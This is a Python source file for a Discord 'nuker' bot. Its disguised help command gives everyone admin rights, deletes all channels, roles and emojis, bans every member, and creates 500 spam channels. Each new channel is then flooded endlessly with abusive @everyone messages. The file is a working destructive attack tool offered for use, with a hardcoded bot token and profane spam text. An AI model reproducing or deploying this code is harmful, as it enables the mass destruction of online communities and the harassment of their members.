import discord
import ctypes
import os
import requests
import socket
import json
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
token = "OTM4OTA1NzcxMzc3MzI0MTAy.YfxGIw.L24Yquj2ckg7JSGV1kciW2cATbs" # Token was changed. Just an example.
winTitle = "NLE NUKER | REVAMPED BY OASIS"

SPAM_CHANNEL =  ["OASIS runs you" , "Get Banned" , "NUKED" , "oops Beamed","F IN CHAT Beamed You","Should Have Listened","Get beamed clowns","Nuked by OASIS ","oops got nuked","I run you","Nuked by OASIS","I run you","kinda got beamed by yourself"]
SPAM_MESSAGE = ["@everyone get fucked by oasis, discord.gg/feds"]

client = commands.Bot(command_prefix="?")
client.remove_command('help')

@client.event
async def on_ready():
   ctypes.windll.kernel32.SetConsoleTitleW("NLE NUKER | REVAMPED BY OASIS")
   os.system('cls')
   url = 'https://api.ipify.org/?format=json'
   r = requests.get(url)
   data = r.json()
   print(f''' {Fore.YELLOW}
                             _     _                                   
                        _wr""        "-q__                         {Fore.MAGENTA}┏━━━━━━━━━━━━━━━━━━━━ {Fore.CYAN}Info{Fore.MAGENTA} ━━━━━━━━━━━━━━━━━━━┓{Fore.YELLOW}    
                     _dP                 9m_                       
                   _#P                     9#_                      {Fore.CYAN}Run command {Fore.YELLOW}!help {Fore.CYAN}to fuck a server up!{Fore.YELLOW}
                  d#@                       9#m                        
                 d##                         ###                    {Fore.RED}[/]{Fore.RESET} Bot Information {Fore.RED}[\]{Fore.YELLOW}
                J###                         ###L                   {Fore.RESET}Your Bot's Name: {Fore.CYAN}{client.user.name}{Fore.YELLOW}  
                ####K                       J###K                   {Fore.RESET}Your Bot's ID: {Fore.CYAN}{client.user.id}{Fore.YELLOW}      
                ]####K      ___aaa___      J####F                   {Fore.RESET}Server Count: {Fore.CYAN}{len(client.guilds)}{Fore.YELLOW}    
            __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
         _g##############mZ_         __g##############m_            {Fore.BLUE}[/]{Fore.RESET} Your Information {Fore.BLUE}[\]{Fore.YELLOW}   
       _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_          {Fore.RESET}Your IP: {Fore.CYAN}{data["ip"]}{Fore.YELLOW}   
      a###""          ,Z"#####@" '######"\g          ""M##m         {Fore.RESET}Your UUID: {Fore.CYAN}{socket.gethostname()}{Fore.YELLOW}    
     J#@"             0L  "*##     ##@"  J#              *#K           
     #"               `#    "_gmwgm_~    dF               `#_          
    7F                 "#_   ]#####F   _dK                 JE       {Fore.CYAN}[?]{Fore.RESET} This was made by Over-EducatedFool{Fore.YELLOW}   
    ]                    *m__ ##### __g@"                   F       {Fore.RESET}and re-vamped by {Fore.CYAN}Oasis.{Fore.YELLOW}   
                          "PJ#####LP"                               {Fore.RESET}Github link:{Fore.YELLOW} https://github.com/3jm/NLE-NUKER  
    `                       0######_                      '          
                          _0########_                              {Fore.MAGENTA}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Fore.YELLOW}     
        .               _d#####^#####m__              ,              
          "*w_________am#####P"   ~9#####mw_________w*"                  
             ""9@#####@M""           ""P@#####@M""                    


  {Fore.RESET}Logs From the bot will be displayed below.
  {Fore.YELLOW}#########################################{Fore.RESET}''')
   await client.change_presence(activity=discord.Game(name="fuck em"))

@client.command()
async def stop(ctx):
    await ctx.bot.logout()
    print(f'[{Fore.GREEN}+{Fore.RESET}] {client.user.name} logged out.{Fore.RESET}')

@client.command()
async def help(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(f'  [{Fore.GREEN}+{Fore.RESET}] Everyone now have admin permissions.')
    except Exception as e:
      print(f"  [{Fore.RED}-{Fore.RESET}] I was unable to give everyone admin | {e}")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f'  [{Fore.GREEN}+{Fore.RESET}] {Fore.MAGENTA}{channel.name}{Fore.RESET} was deleted.')
      except Exception as e:
        print(f"  [{Fore.RED}-{Fore.RESET}] {Fore.MAGENTA}{channel.name}{Fore.RESET} was NOT deleted. | {e}")
    for member in guild.members:
     try:
       await member.ban()
       print(f"  [{Fore.GREEN}+{Fore.RESET}] {member.name}{Fore.MAGENTA}#{Fore.RESET}{member.discriminator} Was banned")
     except Exception as e:
       print(f"  [{Fore.RED}-{Fore.RESET}] {member.name}{Fore.MAGENTA}#{Fore.RESET}{member.discriminator} Was unable to be banned. | {e}")
    for role in guild.roles:
     try:
       await role.delete()
       print(f"  [{Fore.GREEN}+{Fore.RESET}] {Fore.MAGENTA}{role.name}{Fore.RESET} Has been deleted")
     except Exception as e:
       print(f"  [{Fore.RED}-{Fore.RESET}] {Fore.MAGENTA}{role.name}{Fore.RESET} could not be deleted. | {e}")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"  [{Fore.GREEN}+{Fore.RESET}] {Fore.MAGENTA}{emoji.name}{Fore.RESET} Was deleted")
     except Exception as e:
       print(f"  [{Fore.RED}-{Fore.RESET}] {Fore.MAGENTA}{emoji.name}{Fore.RESET} Could not be deleted | {e}")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Blind#2146")
        print(f"  [{Fore.GREEN}+{Fore.RESET}] {user.name}{Fore.MAGENTA}#{Fore.RESET}{user.discriminator} Was successfully unbanned.")
      except Exception as e:
        print(f"  [{Fore.RED}-{Fore.RESET}] {user.name}{Fore.MAGENTA}#{Fore.RESET}{user.discriminator} Was not unbanned. | {e}")
    await guild.create_text_channel("NUKED BY OASIS")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"  [{Fore.GREEN}+{Fore.RESET}]{Fore.YELLOW} New Invite: {Fore.RESET}{link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
       print(f'  [{Fore.GREEN}+{Fore.RESET}] Created new text channel')
    print(f"  [{Fore.GREEN}+{Fore.RESET}] Nuked {Fore.MAGENTA}{guild.name}{Fore.RESET}{Fore.GREEN} Successfully.{Fore.RESET}")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

@client.event
async def on_guild_join(guild):
  print(f'  [{Fore.GREEN}+{Fore.RESET}] Joined {guild.name}')

@client.event
async def on_guild_remove(guild):
  print(f'  [{Fore.RED}-{Fore.RESET}] Left {guild.name}')

client.run(token)
